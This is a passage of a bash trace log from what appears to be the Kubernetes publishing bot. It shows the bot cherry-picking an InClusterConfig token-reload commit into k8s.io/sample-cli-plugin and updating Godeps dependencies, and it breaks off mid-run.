'[' 6d2426b8acccf110fe3fd0ca4efe115610cfec7d = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ '[' master '!=' master ']'\n>\t+ '[' master '!=' master ']'\n>\t+ is-merge 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t++ git show --format=short -q 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t+ return 1\n>\t+ local pick_args=\n>\t+ is-merge 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t++ git show --format=short -q 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t+ return 1\n>\t++ commit-subject 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t++ git show --format=%s -q 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\tCherry-picking k8s.io/kubernetes single-commit 287f6a564fb8c264f281056011f4a66f197b18f4: reload token file for InClusterConfig every 5 minutes.\n>\t+ echo 'Cherry-picking k8s.io/kubernetes single-commit 287f6a564fb8c264f281056011f4a66f197b18f4: reload token file for InClusterConfig every 5 minutes.'\n>\t+ local squash_commits=1\n>\t+ godep-changes 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t+ '[' -n '' ']'\n>\t+ git diff --exit-code --quiet '6d2426b8acccf110fe3fd0ca4efe115610cfec7d^' 6d2426b8acccf110fe3fd0ca4efe115610cfec7d -- Godeps/Godeps.json\n>\t+ reset-godeps '6d2426b8acccf110fe3fd0ca4efe115610cfec7d^'\n>\t+ local 'f_clean_commit=6d2426b8acccf110fe3fd0ca4efe115610cfec7d^'\n>\t++ git ls-tree '6d2426b8acccf110fe3fd0ca4efe115610cfec7d^^{tree}' Godeps\n>\t+ '[' -n '040000 tree a6c075ef908eeaf498ccf70e02d046c39bf6e6bd\tGodeps' ']'\n>\t+ git checkout '6d2426b8acccf110fe3fd0ca4efe115610cfec7d^' Godeps\n>\t+ git add Godeps\n>\t+ git commit -q -m 'sync: reset Godeps/Godeps.json' --allow-empty\n>\t+ squash_commits=2\n>\t+ dst_needs_godeps_update=true\n>\t++ commit-date 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t++ git show --format=%aD -q 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t+ GIT_COMMITTER_DATE='Mon, 13 Aug 2018 16:47:17 -0700'\n>\t+ git cherry-pick --keep-redundant-commits 6d2426b8acccf110fe3fd0ca4efe115610cfec7d\n>\t+ squash 2\n>\t++ git rev-parse HEAD\n>\t+ local head=24a62a246a7e644b249d22d6d154e76da6af7a2d\n>\t+ git reset -q --soft HEAD~2\n>\t++ committer-date 24a62a246a7e644b249d22d6d154e76da6af7a2d\n>\t++ git show --format=%cD -q 24a62a246a7e644b249d22d6d154e76da6af7a2d\n>\t+ GIT_COMMITTER_DATE='Mon, 13 Aug 2018 16:47:17 -0700'\n>\t+ git commit --allow-empty -q -C 24a62a246a7e644b249d22d6d154e76da6af7a2d\n>\t+ '[' -z 7b6647a418c660f2c87f183f706b297f1cb573ca ']'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n 7b6647a418c660f2c87f183f706b297f1cb573ca ']'\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT '!=' 7b6647a418c660f2c87f183f706b297f1cb573ca ']'\n>\t+ local dst_parent2=HEAD\n>\t+ '[' master '!=' master ']'\n>\t++ commit-subject 7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t++ git show --format=%s -q 7b6647a418c660f2c87f183f706b297f1cb573ca\n>\tCherry-picking source dropped-merge 7b6647a418c660f2c87f183f706b297f1cb573ca: Merge pull request #67359 from mikedanese/reloadtoken.\n>\t+ echo 'Cherry-picking source dropped-merge 7b6647a418c660f2c87f183f706b297f1cb573ca: Merge pull request #67359 from mikedanese/reloadtoken.'\n>\t++ commit-date 7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t++ git show --format=%aD -q 7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+ local 'date=Sat, 1 Sep 2018 23:23:10 -0700'\n>\t+++ commit-message 7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+++ git show --format=%B -q 7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+++ echo\n>\t+++ echo 'Kubernetes-commit: 7b6647a418c660f2c87f183f706b297f1cb573ca'\n>\t++ GIT_COMMITTER_DATE='Sat, 1 Sep 2018 23:23:10 -0700'\n>\t++ GIT_AUTHOR_DATE='Sat, 1 Sep 2018 23:23:10 -0700'\n>\t++ git commit-tree -p 449d505130128527e78e72633042a4c1dbbfcb06 -p HEAD -m 'Merge pull request #67359 from mikedanese/reloadtoken\n>\n>\tAutomatic merge from submit-queue. If you want to cherry-pick this change to another branch, please follow the instructions here: https://github.com/kubernetes/community/blob/master/contributors/devel/cherry-picks.md.\n>\n>\tclient: periodically reload InClusterConfig token\n>\n>\t/sig auth\r\n>\t/sig api-machinery\r\n>\t\r\n>\t```release-note\r\n>\tNONE\r\n>\t```\n>\n>\tKubernetes-commit: 7b6647a418c660f2c87f183f706b297f1cb573ca' 'HEAD^{tree}'\n>\t+ local dst_new_merge=b1670209b4d8a0371b1c1d1d2f29bd426b170041\n>\t+ git reset -q --hard b1670209b4d8a0371b1c1d1d2f29bd426b170041\n>\t+ fix-godeps api:master,apimachinery:master,cli-runtime:master,client-go:master '' k8s.io false true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=b1670209b4d8a0371b1c1d1d2f29bd426b170041\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps api:master,apimachinery:master,cli-runtime:master,client-go:master k8s.io false Kubernetes-commit\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cli-runtime/\") or . == \"k8s.io/cli-runtime\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/sample-cli-plugin/\") or . == \"k8s.io/sample-cli-plugin\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+ '[' -z 7b6647a418c660f2c87f183f706b297f1cb573ca ']'\n>\t++ git-find-merge 7b6647a418c660f2c87f183f706b297f1cb573ca upstream-branch\n>\t++ tail -1\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list '7b6647a418c660f2c87f183f706b297f1cb573ca^1..upstream-branch' --first-parent\n>\t+++ git rev-list 7b6647a418c660f2c87f183f706b297f1cb573ca..upstream-branch --ancestry-path\n>\t+++ git rev-parse 7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+ local k_last_kube_merge=7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 7b6647a418c660f2c87f183f706b297f1cb573ca ../kube-commits-api-master\n>\t+ '[' -z fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1 ']'\n>\t+ pushd ../api\n>\tChecking out k8s.io/api to fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1\n>\t+ echo 'Checking out k8s.io/api to fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1'\n>\t+ git checkout -q fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.\n>\t++ look -b 7b6647a418c660f2c87f183f706b297f1cb573ca ../kube-commits-apimachinery-master\n>\t+ '[' -z 9dc1de72c0f3996657ffc88895f89f3844d8cf01 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to 9dc1de72c0f3996657ffc88895f89f3844d8cf01'\n>\tChecking out k8s.io/apimachinery to 9dc1de72c0f3996657ffc88895f89f3844d8cf01\n>\t+ git checkout -q 9dc1de72c0f3996657ffc88895f89f3844d8cf01\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=cli-runtime\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.\n>\t++ look -b 7b6647a418c660f2c87f183f706b297f1cb573ca ../kube-commits-cli-runtime-master\n>\t+ '[' -z 40e6dc1f709383f5a214c4df9120695527eea6df ']'\n>\t+ pushd ../cli-runtime\n>\t+ echo 'Checking out k8s.io/cli-runtime to 40e6dc1f709383f5a214c4df9120695527eea6df'\n>\tChecking out k8s.io/cli-runtime to 40e6dc1f709383f5a214c4df9120695527eea6df\n>\t+ git checkout -q 40e6dc1f709383f5a214c4df9120695527eea6df\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.'\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 7b6647a418c660f2c87f183f706b297f1cb573ca ../kube-commits-client-go-master\n>\t+ '[' -z f06dbfd7354359a944eca1b0a555067933f10c3e ']'\n>\t+ pushd ../client-go\n>\t+ echo 'Checking out k8s.io/client-go to f06dbfd7354359a944eca1b0a555067933f10c3e'\n>\t+ git checkout -q f06dbfd7354359a944eca1b0a555067933f10c3e\n>\tChecking out k8s.io/client-go to f06dbfd7354359a944eca1b0a555067933f10c3e\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 1\n>\t+ echo 'Committing vendor/ and Godeps/Godeps.json.'\n>\t+ git commit -q -m 'sync: update godeps'\n>\tCommitting vendor/ and Godeps/Godeps.json.\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code b1670209b4d8a0371b1c1d1d2f29bd426b170041\n>\t+ '[' true = true ']'\n>\t+ echo 'Amending last merge with godep changes.'\n>\t+ git reset --soft -q b1670209b4d8a0371b1c1d1d2f29bd426b170041\n>\tAmending last merge with godep changes.\n>\t+ git commit -q --amend --allow-empty -C b1670209b4d8a0371b1c1d1d2f29bd426b170041\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ dst_merge_point_commit=f4e363a823fe8eaa807df3be1cacda3d2ffe7f66\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' f4e363a823fe8eaa807df3be1cacda3d2ffe7f66 '!=' 068ebcf28c7f10ec02a922762b6e044ad6aba0ff ']'\n>\t+ fix-godeps api:master,apimachinery:master,cli-runtime:master,client-go:master '' k8s.io false true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=f4e363a823fe8eaa807df3be1cacda3d2ffe7f66\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps api:master,apimachinery:master,cli-runtime:master,client-go:master k8s.io false Kubernetes-commit\n>\t+ local deps=api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ indent-godeps\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/cli-runtime/\") or . == \"k8s.io/cli-runtime\") | not))' Godeps/Godeps.json\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/sample-cli-plugin/\") or . == \"k8s.io/sample-cli-plugin\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit api:master,apimachinery:master,cli-runtime:master,client-go:master\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+ '[' -z 7b6647a418c660f2c87f183f706b297f1cb573ca ']'\n>\t++ git-find-merge 7b6647a418c660f2c87f183f706b297f1cb573ca upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '7b6647a418c660f2c87f183f706b297f1cb573ca^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 7b6647a418c660f2c87f183f706b297f1cb573ca..upstream-branch --ancestry-path\n>\t+++ git rev-parse 7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+ local k_last_kube_merge=7b6647a418c660f2c87f183f706b297f1cb573ca\n>\t+ local dep_count=4\n>\t+ (( i=0 ))\n>\t+ (( i<4 ))\n>\t+ local dep=api\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/api corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.\n>\t++ look -b 7b6647a418c660f2c87f183f706b297f1cb573ca ../kube-commits-api-master\n>\t+ '[' -z fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1 ']'\n>\t+ pushd ../api\n>\t+ echo 'Checking out k8s.io/api to fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1'\n>\tChecking out k8s.io/api to fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1\n>\t+ git checkout -q fcb01e9febf3e72ae9b6eff41f2d02ffdea4dda1\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=apimachinery\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\tLooking up which commit in the master branch of k8s.io/apimachinery corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.\n>\t++ look -b 7b6647a418c660f2c87f183f706b297f1cb573ca ../kube-commits-apimachinery-master\n>\t+ '[' -z 9dc1de72c0f3996657ffc88895f89f3844d8cf01 ']'\n>\t+ pushd ../apimachinery\n>\t+ echo 'Checking out k8s.io/apimachinery to 9dc1de72c0f3996657ffc88895f89f3844d8cf01'\n>\tChecking out k8s.io/apimachinery to 9dc1de72c0f3996657ffc88895f89f3844d8cf01\n>\t+ git checkout -q 9dc1de72c0f3996657ffc88895f89f3844d8cf01\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=cli-runtime\n>\t+ local branch=master\n>\tLooking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/cli-runtime corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\t+ read k_commit dep_commit\n>\t++ look -b 7b6647a418c660f2c87f183f706b297f1cb573ca ../kube-commits-cli-runtime-master\n>\t+ '[' -z 40e6dc1f709383f5a214c4df9120695527eea6df ']'\n>\t+ pushd ../cli-runtime\n>\tChecking out k8s.io/cli-runtime to 40e6dc1f709383f5a214c4df9120695527eea6df\n>\t+ echo 'Checking out k8s.io/cli-runtime to 40e6dc1f709383f5a214c4df9120695527eea6df'\n>\t+ git checkout -q 40e6dc1f709383f5a214c4df9120695527eea6df\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ local dep=client-go\n>\t+ local branch=master\n>\t+ echo 'Looking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.'\n>\t+ local k_commit=\n>\t+ local dep_commit=\n>\tLooking up which commit in the master branch of k8s.io/client-go corresponds to k8s.io/kubernetes commit 7b6647a418c660f2c87f183f706b297f1cb573ca.\n>\t+ read k_commit dep_commit\n>\t++ look -b 7b6647a418c660f2c87f183f706b297f1cb573ca ../kube-commits-client-go-master\n>\t+ '[' -z f06dbfd7354359a944eca1b0a555067933f10c3e ']'\n>\t+ pushd ../client-go\n>\tChecking out k8s.io/client-go to f06dbfd7354359a944eca1b0a555067933f10c3e\n>\t+ echo 'Checking out k8s.io/client-go to f06dbfd7354359a944eca1b0a555067933f10c3e'\n>\t+ git checkout -q f06dbfd7354359a944eca1b0a555067933f10c3e\n>\t+ popd\n>\t+ (( i++  ))\n>\t+ (( i<4 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tGodeps.json hasn't changed!\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code f4e363a823fe8eaa807df3be1cacda3d2ffe7f66\n>\tRemove redundant godep commits on-top of f4e363a823fe8eaa807df3be1cacda3d2ffe7f66.\n>\t+ echo 'Remove redundant godep commits on-top of f4e363a823fe8eaa807df3be1cacda3d2ffe7f66.'\n>\t+ git reset --soft -q f4e363a823fe8eaa807df3be1cacda3d2ffe7f66\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/sample-cli-plugin\n>\t+ local repo=sample-cli-plugin\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n 'f4e363a Merge pull request #67359 from mikedanese/reloadtoken' ']'\n>\t+ echo 'Writing k8s.io/kubernetes commit lookup table to ../kube-commits-sample-cli-plugin-master'\n>\tWriting k8s.io/kubernetes commit lookup table to ../kube-commits-sample-cli-plugin-master\n>\t++ echo kubernetes\n>\t++ sed 's/^./\\L\\u&/'\n>\t+ /collapsed-kube-commit-mapper --commit-message-tag Kubernetes-commit --source-branch refs/heads/upstream-branch\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ 